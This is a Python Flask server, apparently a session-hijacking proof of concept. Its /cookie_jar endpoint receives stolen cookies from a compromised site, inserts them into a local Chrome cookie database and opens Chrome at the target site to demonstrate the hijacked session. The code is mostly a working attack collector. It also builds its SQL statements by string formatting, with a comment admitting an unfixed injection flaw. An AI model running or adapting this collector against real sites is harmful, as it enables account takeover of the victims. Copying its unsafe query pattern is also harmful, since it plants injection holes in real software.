import sqlite3
import sys
from flask import Flask, request, render_template
from pprint import pprint
from subprocess import call
from datetime import datetime

app = Flask(__name__)

if len(sys.argv) < 2:
    print("Usage: python3 server.py <PATH_TO_CHROME_COOKIE_DATABASE>")
    sys.exit(1)
conn = sqlite3.connect(sys.argv[1])

COOKIE_COMMAND = """
INSERT INTO cookies ({}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {})
VALUES ({}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {}, {});
"""

URL_WHITELIST = set("abcdefghijklmnopqrstuvwxyz1234567890./")

CHECK_COMMAND = """SELECT * FROM cookies WHERE (creation_utc = "{}") LIMIT 1"""


def make_cookie_dict(host_key, name, encrypted_value):
    cookie = {
        "creation_utc": 13120468750054245,       # timecodes have been hardcoded for now
        "host_key": "'{}'".format(host_key),
        "name": "'{}'".format(name),
        "value": "'chocolatechip'",              # meaningless
        "path": "'/'",
        "expires_utc": 13435828750000000,
        "secure": 0,
        "httponly": 0,
        "last_access_utc": 13133004531246831,
        "has_expires": 1,
        "persistent": 1,
        "priority": 1,
        "encrypted_value": encrypted_value,      # this is the one chrome actually reads
        "firstpartyonly": 0,
    }
    return cookie


def make_cookie_sql(cookie):
    # TODO: fix sql injection here
    columns, values = zip(*cookie.items())
    sql = COOKIE_COMMAND.format(*(columns + values))
    return sql


def add_cookie(cookie, c):
    sql = make_cookie_sql(cookie)
    c.execute(sql)
    conn.commit()

    c.execute(CHECK_COMMAND.format(cookie['creation_utc']))
    if not [_ for _ in c]:
        print("FAILED TO ADD COOKIE")


def remove_cookie(cookie, c):
    c.execute("""DELETE FROM cookies WHERE (creation_utc = "{}") LIMIT 1""".format(cookie['creation_utc']))
    conn.commit()


@app.route("/")
def home():
    return "POST cookies in /cookie_jar"


"""
Expects a POST request with the following data:
url - the url of the compromised site
cookie_name - the name of the stolen cookie
cookie_value - the value of the stolen cookie (must be an integer)
"""
@app.route("/cookie_jar", methods=["POST"])
def store_cookie():
    url = request.form.get("url")
    cname = request.form.get("cookie_name")
    cval = request.form.get("cookie_value")

    # whitelist the url to prevent arbitrary shell execution
    if not (set(url) <= URL_WHITELIST):
        return "INVALID URL: {}".format(url)

    c = conn.cursor()

    cookie = make_cookie_dict(url, cname, cval)

    remove_cookie(cookie, c)    # remove using utc in case it was already added
    add_cookie(cookie, c)

    # open chrome at the target site to demonstrate the stolen cookie
    call(["google-chrome", "{}".format(url)])

    return "Success"


if __name__ == "__main__":
    app.run('0.0.0.0', 5000)
